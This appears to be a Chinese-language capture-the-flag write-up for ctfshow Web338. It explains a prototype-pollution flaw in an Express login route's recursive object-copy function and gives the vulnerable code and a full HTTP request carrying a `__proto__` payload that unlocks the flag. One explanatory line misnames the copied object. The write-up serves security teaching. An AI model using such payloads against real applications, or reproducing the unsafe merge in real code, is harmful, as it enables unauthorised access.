# Web338

首先从入口文件看起，`app.js`，发现两个关键路径

```javascript
app.use('/', indexRouter);
app.use('/login', loginRouter);
```

当然主页就不用看了，直接看关键部分，login，从当中我们不难得出需要让`secert.ctfshow==='36dboy'`即可获取flag，这里很简单，原型链污染嘛

```javascript
/* GET home page.  */
router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow==='36dboy'){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  } 
});
```

其中涉及到这一部分的利用函数就是`copy`，这是一个递归调用函数，for循环遍历object2当中的key(键)，如果这个键在object1与object2当中都存在，则调用`copy(object1[key], object2[key])`,否则让`object1[key] = object2[key]`

```javascript
function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 && key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
```

那如果我们让`object2`为`{"__proto__":{"ctfshow":"36dboy"}}`会发生什么（注意本题当中object1为secret变量）

由于`object1和object2`的对象都具有属性`__proto__`,进入if语句为true，执行

`copy(object1[__proto__], object2[__proto__])`

此时`let key in object2`的`key`为`ctfshow`很明显object1当中没有，所以进入else部分

`object1[ctfshow] = object2[ctfshow]`，成功赋值为`36dboy`

burpsuite发送请求包即可获取flag

```
POST /login HTTP/1.1
Host: 4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show
Content-Length: 34
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Content-Type: application/json
Origin: http://4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show
Referer: http://4ffe41ca-e762-4c9a-b7e1-56edabb0ab85.chall.ctf.show/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=176b20985423e8-07d414625df175-3323765-144000-176b209854358f
Connection: close

{"__proto__":{"ctfshow":"36dboy"}}
```

